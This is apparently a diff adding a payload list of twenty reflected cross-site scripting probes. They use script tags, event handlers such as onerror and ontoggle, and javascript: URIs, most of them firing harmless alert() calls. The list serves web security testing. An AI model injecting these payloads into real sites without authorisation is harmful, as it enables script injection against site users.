@@ -1,0 +1,21 @@
+<script>alert('Reflected XSS 1')</script>
+<img src=x onerror=alert('Reflected XSS 2')>
+<svg/onload=alert('Reflected XSS 3')>
+<script>document.title='Reflected XSS 4'</script>
+<div onclick=alert('Reflected XSS 5')>Click Me</div>
+<a href="javascript:alert('Reflected XSS 6')">Click Me</a>
+<iframe src="javascript:alert('Reflected XSS 7')"></iframe>
+<body onresize=alert('Reflected XSS 8')>
+<details ontoggle=alert('Reflected XSS 9')>
+<select onfocus=alert('Reflected XSS 10')>
+<script>alert('Reflected XSS 11')</script>
+<img src=x onerror=alert('Reflected XSS 12')>
+<svg/onload=alert('Reflected XSS 13')>
+<script>document.body.style.backgroundColor='red'</script>
+<div onmouseover=alert('Reflected XSS 15')>Hover Me</div>
+<a href="javascript:alert('Reflected XSS 16')">Click Me</a>
+<iframe src="javascript:alert('Reflected XSS 17')"></iframe>
+<body onload=alert('Reflected XSS 18')>
+<details open ontoggle=alert('Reflected XSS 19')>
+<select autofocus onfocus=alert('Reflected XSS 20')>
+<!-- Continue this pattern up to 50 -->
